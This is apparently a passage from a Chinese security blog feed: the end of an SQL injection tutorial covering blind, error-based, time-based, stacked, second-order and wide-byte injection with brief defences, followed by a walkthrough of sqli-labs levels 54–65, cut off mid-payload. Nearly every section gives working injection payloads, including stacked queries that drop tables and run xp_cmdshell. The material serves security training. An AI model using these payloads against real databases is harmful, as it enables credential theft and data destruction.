href="#2、Boolean布尔型盲注" class="headerlink" title="2、Boolean布尔型盲注"></a>2、Boolean布尔型盲注</h2><p>含义：在页面中不会显示数据库信息，一般情况下只会显示对与错的内容。</p><h4 id="if-1-1-1-0"><a href="#if-1-1-1-0" class="headerlink" title="if(1=1,1,0)"></a>if(1=1,1,0)</h4><p>● if(参数1，参数2，参数3）</p><p>● 参数1是语句，参数2表示正确时显示，参数3表示错误时显示</p><h4 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h4><p>● substr(参数1，参数2，参数3）</p><p>● 参数1是字符串，参数2是开始截取（索引从1开始），参数3是截取的长度</p><h3 id="（1）判断-1"><a href="#（1）判断-1" class="headerlink" title="（1）判断"></a>（1）判断</h3><p>传入1正常，传入1’报错</p><p>传入1’ and ‘1’=’1 和传入 1’ and ‘1’=’2  页面回显不一样</p><h3 id="（2）获取敏感信息"><a href="#（2）获取敏感信息" class="headerlink" title="（2）获取敏感信息"></a>（2）获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr(user(),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+判断数据库用户名第一个字符是否为a，是则返回1，否则返回0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="（3）获取数据库名"><a href="#（3）获取数据库名" class="headerlink" title="（3）获取数据库名"></a>（3）获取数据库名</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr(database(),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+可抓包对变量1：长度，变量2：a~zA~Z0~9._@  这两个变量进行爆破<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="（4）获取表名"><a href="#（4）获取表名" class="headerlink" title="（4）获取表名"></a>（4）获取表名</h3><pre class="line-numbers language-bash"><code class="language-bash">1’ and if<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 1<span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>,1,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（5）获取字段名"><a href="#（5）获取字段名" class="headerlink" title="（5）获取字段名"></a>（5）获取字段名</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr((select column_name form information_schema.columns where table_name='</span><span class="token function">users</span><span class="token string">' limit 1,1),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（6）获取表的内容"><a href="#（6）获取表的内容" class="headerlink" title="（6）获取表的内容"></a>（6）获取表的内容</h3><pre class="line-numbers language-bash"><code class="language-bash">1’ and if<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select concat<span class="token punctuation">(</span>user,0x3a,password<span class="token punctuation">)</span>from <span class="token function">users</span> limit 1<span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>,1,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、报错注入"><a href="#3、报错注入" class="headerlink" title="3、报错注入"></a>3、报错注入</h2><p>含义：数据库显错是指，数据库在执行时，遇到语法不对，会显示报错信息。</p><h3 id="（1）判断-2"><a href="#（1）判断-2" class="headerlink" title="（1）判断"></a>（1）判断</h3><p>输入单引号 如果报错有可能存在报错注入，如果拼接 SQL 语句带入到 mysql 执行即存在报错注入</p><h3 id="（2）获取库名"><a href="#（2）获取库名" class="headerlink" title="（2）获取库名"></a>（2）获取库名</h3><pre class="line-numbers language-bash"><code class="language-bash">1' and info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+原理：会报错显示当前库（库名会显示出来）不存在这个函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="（3）获取敏感信息-1"><a href="#（3）获取敏感信息-1" class="headerlink" title="（3）获取敏感信息"></a>（3）获取敏感信息</h3><h4 id="●-updatexml-函数"><a href="#●-updatexml-函数" class="headerlink" title="● updatexml()函数"></a>● updatexml()函数</h4><pre class="line-numbers language-bash"><code class="language-bash">1' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+可将user<span class="token punctuation">(</span><span class="token punctuation">)</span>换成database<span class="token punctuation">(</span><span class="token punctuation">)</span>，version<span class="token punctuation">(</span><span class="token punctuation">)</span>等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="●-extractvalue-函数"><a href="#●-extractvalue-函数" class="headerlink" title="● extractvalue()函数"></a>● extractvalue()函数</h4><pre class="line-numbers language-bash"><code class="language-bash">1' and extractvalue<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="●-floor-函数"><a href="#●-floor-函数" class="headerlink" title="● floor()函数"></a>● floor()函数</h4><pre class="line-numbers language-bash"><code class="language-bash">1' and <span class="token punctuation">(</span>select count<span class="token punctuation">(</span>*<span class="token punctuation">)</span> from information_schema.tables group by concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span>0<span class="token punctuation">)</span>*2<span class="token punctuation">))</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、时间注入（延时注入，基于时间的SQL盲注）"><a href="#4、时间注入（延时注入，基于时间的SQL盲注）" class="headerlink" title="4、时间注入（延时注入，基于时间的SQL盲注）"></a>4、时间注入（延时注入，基于时间的SQL盲注）</h2><p>含义：时间注入又名延时注入，属于盲注入的一种，通常是某个注入点无法通过布尔型注入获取数据而采用一种突破注入的技巧。跟布尔型差不多，只是将布尔型如果成功显示1换成如果成功延时多少秒。</p><h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h4><p>sleep() 是延时的意思，sleep(10)就是数据库延时10 秒返回内容。</p><h3 id="（1）判断-3"><a href="#（1）判断-3" class="headerlink" title="（1）判断"></a>（1）判断</h3><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1' and sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>--+  存在延时<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（2）获取敏感信息-1"><a href="#（2）获取敏感信息-1" class="headerlink" title="（2）获取敏感信息"></a>（2）获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr(user(),1,1)='</span>a',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+判断数据库用户名第一个字符是否为a，是则返回1，否则返回0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="（3）获取数据库名-1"><a href="#（3）获取数据库名-1" class="headerlink" title="（3）获取数据库名"></a>（3）获取数据库名</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr(database(),1,1)='</span>s',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5、堆叠注入（多语句查询注入）"><a href="#5、堆叠注入（多语句查询注入）" class="headerlink" title="5、堆叠注入（多语句查询注入）"></a>5、堆叠注入（多语句查询注入）</h2><p>含义：可以执行多条sql语句，语句之间以分号隔开。</p><p>堆叠注入主要用来实现数据库的增删查改操作：</p><h3 id="MySQL："><a href="#MySQL：" class="headerlink" title="MySQL："></a>MySQL：</h3><h4 id="（1）新建一个表"><a href="#（1）新建一个表" class="headerlink" title="（1）新建一个表"></a>（1）新建一个表</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>create table <span class="token function">test</span> like <span class="token function">users</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（2）删除表"><a href="#（2）删除表" class="headerlink" title="（2）删除表"></a>（2）删除表</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>drop table <span class="token function">test</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（3）查询数据"><a href="#（3）查询数据" class="headerlink" title="（3）查询数据"></a>（3）查询数据</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span><span class="token keyword">select</span> 1,2,3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（4）加载文件"><a href="#（4）加载文件" class="headerlink" title="（4）加载文件"></a>（4）加载文件</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'C:/1.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（5）修改数据"><a href="#（5）修改数据" class="headerlink" title="（5）修改数据"></a>（5）修改数据</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>insert into users<span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span> values<span class="token punctuation">(</span><span class="token string">'100'</span>,<span class="token string">'new'</span>,<span class="token string">'new'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SqlServer："><a href="#SqlServer：" class="headerlink" title="SqlServer："></a>SqlServer：</h3><h4 id="（1）新建一个表-1"><a href="#（1）新建一个表-1" class="headerlink" title="（1）新建一个表"></a>（1）新建一个表</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from <span class="token function">test</span><span class="token punctuation">;</span>create table sc3<span class="token punctuation">(</span>ss CHAR<span class="token punctuation">(</span>8<span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（2）删除表-1"><a href="#（2）删除表-1" class="headerlink" title="（2）删除表"></a>（2）删除表</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from <span class="token function">test</span><span class="token punctuation">;</span>drop table sc3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（3）查询数据-1"><a href="#（3）查询数据-1" class="headerlink" title="（3）查询数据"></a>（3）查询数据</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> 1,2,3<span class="token punctuation">;</span><span class="token keyword">select</span> * from <span class="token function">test</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（4）修改数据"><a href="#（4）修改数据" class="headerlink" title="（4）修改数据"></a>（4）修改数据</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from <span class="token function">test</span><span class="token punctuation">;</span>update <span class="token function">test</span> <span class="token keyword">set</span> name<span class="token operator">=</span><span class="token string">'test'</span> where id<span class="token operator">=</span>3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（5）存储过程的执行"><a href="#（5）存储过程的执行" class="headerlink" title="（5）存储过程的执行"></a>（5）存储过程的执行</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from <span class="token function">test</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span><span class="token function">exec</span> master<span class="token punctuation">..</span>xp_cmdshell <span class="token string">'ipconfig'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Oracle不能使用堆叠注入"><a href="#Oracle不能使用堆叠注入" class="headerlink" title="Oracle不能使用堆叠注入"></a>Oracle不能使用堆叠注入</h3><h3 id="Postgresql："><a href="#Postgresql：" class="headerlink" title="Postgresql："></a>Postgresql：</h3><h4 id="（1）新建一个表-2"><a href="#（1）新建一个表-2" class="headerlink" title="（1）新建一个表"></a>（1）新建一个表</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from user_test<span class="token punctuation">;</span>create table user_data<span class="token punctuation">(</span>id DATE<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（2）删除表-2"><a href="#（2）删除表-2" class="headerlink" title="（2）删除表"></a>（2）删除表</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from user_test<span class="token punctuation">;</span>delete from user_data<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（3）查询数据-2"><a href="#（3）查询数据-2" class="headerlink" title="（3）查询数据"></a>（3）查询数据</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from user_test<span class="token punctuation">;</span><span class="token keyword">select</span> 1,2,3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（4）修改数据-1"><a href="#（4）修改数据-1" class="headerlink" title="（4）修改数据"></a>（4）修改数据</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from user_test<span class="token punctuation">;</span>update user_test <span class="token keyword">set</span> name<span class="token operator">=</span><span class="token string">'modify'</span> where name<span class="token operator">=</span><span class="token string">'张三'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6、二次注入"><a href="#6、二次注入" class="headerlink" title="6、二次注入"></a>6、二次注入</h2><p>含义：将可能导致sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。</p><p>原理：插入恶意数据库——&gt;引用恶意数据</p><h2 id="7、宽字节注入"><a href="#7、宽字节注入" class="headerlink" title="7、宽字节注入"></a>7、宽字节注入</h2><p>产生原因：数据库编码与PHP编码设置为不同的两个编码。</p><p> Big5和GBK字符集有可能会存在宽字节注入，utf-8和gb2312没有。Mysql在使用GBK编码时，会认为两个字符为一个汉字。</p><h4 id="思路一："><a href="#思路一：" class="headerlink" title="思路一："></a>思路一：</h4><p>%df吃掉\  原因在于urldecode(‘)=%5c%27,而我们在前面添加%df，就形成了%df%5c%27,mysql在GBK编码中前两个字当做一个汉字，此时%27就会作为一个单独的字符，也就是’</p><h4 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h4><p>将&#39;中的\过滤掉。可以构造%**%5c%5c%27，后面的%5c会被前面的%5c给注释掉。</p><h1 id="00x5-sql注入防御"><a href="#00x5-sql注入防御" class="headerlink" title="00x5 sql注入防御"></a>00x5 sql注入防御</h1><ul><li><p>1.使用安全的API，避免使用解释器  </p></li><li><p>2.对输入的特殊的字符进行ESCAPE转义处理  </p></li><li><p>3.使用白名单来规范化的输入验证方法  </p></li><li><p>4.使用预编译</p></li></ul><h1 id="00x6-思维导图"><a href="#00x6-思维导图" class="headerlink" title="00x6 思维导图"></a>00x6 思维导图</h1><p>最后放张上面知识的思维导图版吧</p><img src="/posts/b737/1.png" class>]]></content>
    
    
    <categories>
      
      <category>web漏洞原理总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>web漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli靶场(54~65关)</title>
    <link href="/posts/b894.html"/>
    <url>/posts/b894.html</url>
    
    <content type="html"><![CDATA[<p>最后一个部分啦~</p><span id="more"></span><h1 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h1><p>本关是字符型注入，但是只能尝试十次，这里的表名和密码等是每十次尝试后就强制进行更换。已知数据库名字叫做 challenges。</p><h3 id="54-1获取表名"><a href="#54-1获取表名" class="headerlink" title="54.1获取表名"></a>54.1获取表名</h3><pre class="line-numbers language-bash"><code class="language-bash">payloay：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为2ope75q6zd</p><img src="/posts/b894/54.png" class><h3 id="54-2获得列名"><a href="#54-2获得列名" class="headerlink" title="54.2获得列名"></a>54.2获得列名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='</span>2ope75q6zd'<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到列名为：</p><p> <img src="/posts/b894/54_2.png" class></p><h3 id="54-3获得密码"><a href="#54-3获得密码" class="headerlink" title="54.3获得密码"></a>54.3获得密码</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>secret_05Z3<span class="token punctuation">)</span> from challenges.2ope75q6zd<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到密码为lfBO3vPE7GdhmgTXQczwr2ne</p><p> <img src="/posts/b894/54_3.png" class></p><p>实际渗透测试当中，我们可以利用更换 ip（可以考虑代理）或者更换浏览器等，要看服务器端检测什么内容进行限制。</p><h1 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h1><p>本关和 less54 差不多，只要将上述的语句的’换成)即可，但是这里要求次数为 14 次。</p><h3 id="55-1获得表名"><a href="#55-1获得表名" class="headerlink" title="55.1获得表名"></a>55.1获得表名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1<span class="token punctuation">)</span> union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为i06vq2flin</p><p> <img src="/posts/b894/55.png" class></p><h3 id="55-2获得列名"><a href="#55-2获得列名" class="headerlink" title="55.2获得列名"></a>55.2获得列名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1<span class="token punctuation">)</span> union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_name<span class="token operator">=</span><span class="token string">'i06vq2flin'</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到列名为：</p><p> <img src="/posts/b894/55_2.png" class></p><h3 id="55-3获得密码"><a href="#55-3获得密码" class="headerlink" title="55.3获得密码"></a>55.3获得密码</h3><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>-1<span class="token punctuation">)</span> union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>secret_3IW0<span class="token punctuation">)</span> from challenges.i06vq2flin<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到密码为sUPkMFLHHcCFx53qGcVnWgeK</p><p> <img src="/posts/b894/55_3.png" class></p><h1 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h1><p>与less54.55 形式是一致的，只是sql语句中id=(‘$id’)</p><h4 id="获得表名："><a href="#获得表名：" class="headerlink" title="获得表名："></a>获得表名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>-1'<span class="token punctuation">)</span> union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为aeiv7ims93</p><p> <img src="/posts/b894/56.png" class></p><p>后面的以此类推。</p><h1 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h1><p>与前面关卡形式是一致的，只是sql语句中id=”$id”</p><h4 id="获得表名：-1"><a href="#获得表名：-1" class="headerlink" title="获得表名："></a>获得表名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>-1" union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为9vdsnwwupd</p><p> <img src="/posts/b894/57.png" class></p><h1 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h1><p>当我们采用之前的union联合语句时，并没有出现表的信息。</p><h3 id="采用报错注入："><a href="#采用报错注入：" class="headerlink" title="采用报错注入："></a>采用报错注入：</h3><h3 id="58-1获得表名"><a href="#58-1获得表名" class="headerlink" title="58.1获得表名"></a>58.1获得表名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为six41nqivz</p><p> <img src="/posts/b894/58.png" class></p><h3 id="58-2获得列名"><a href="#58-2获得列名" class="headerlink" title="58.2获得列名"></a>58.2获得列名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>six41nqivz'<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>获得列名：</p><p> <img src="/posts/b894/58_2.png" class></p><h3 id="58-3获得密码"><a href="#58-3获得密码" class="headerlink" title="58.3获得密码"></a>58.3获得密码</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>secret_AVJD<span class="token punctuation">)</span> from challenges.six41nqivz<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到密码为Vee33Ad4mu5g9yGiAxqXFv4x</p><p> <img src="/posts/b894/58_3.png" class></p><h1 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h1><p>与Less58基本一样，也采用报错注入。只要将单引号去掉即可。</p><h4 id="获得表名"><a href="#获得表名" class="headerlink" title="获得表名"></a>获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为grox7vwdve</p><p> <img src="/posts/b894/59.png" class></p><h1 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h1><p>与Less58基本一样，也采用报错注入。只要将’改成1”)即可。</p><h4 id="获得表名-1"><a href="#获得表名-1" class="headerlink" title="获得表名"></a>获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1"<span class="token punctuation">)</span> and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为t6f0xzgydq</p><p> <img src="/posts/b894/60.png" class></p><h1 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h1><p>与Less58基本一样，也采用报错注入。只要将’改成’))即可。</p><h4 id="获得表名-2"><a href="#获得表名-2" class="headerlink" title="获得表名"></a>获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1'<span class="token punctuation">))</span> and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为dfgn4x3x0d</p><p> <img src="/posts/b894/61.png" class></p><h1 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h1><p>本关union和报错注入都已经失效了，那就要使用延时注入了。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1'<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schhema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span>79,1,sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里找到一个好的脚本，可以引用一下：</p><p><a href="https://www.jianshu.com/p/f1811e108d58">https://www.jianshu.com/p/f1811e108d58</a></p><p>我就直接根据脚本得到了表名和密码：</p><p> <img src="/posts/b894/62.png" class></p><h1 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h1><p>与Less-62一样，采用盲注，只需要将’)改成’即可。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1' and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schhema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span>79,1,sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>同样利用脚本可得到表名和密码：</p><p> <img src="/posts/b894/63.png" class></p><h1 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h1><p>与Less-62一样，采用盲注，只需要将’)改成))即可。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token punctuation">))</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schhema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span>79,1,sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h1><p>与Less-62一样，采用盲注，只需要将’)改成”)即可。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token 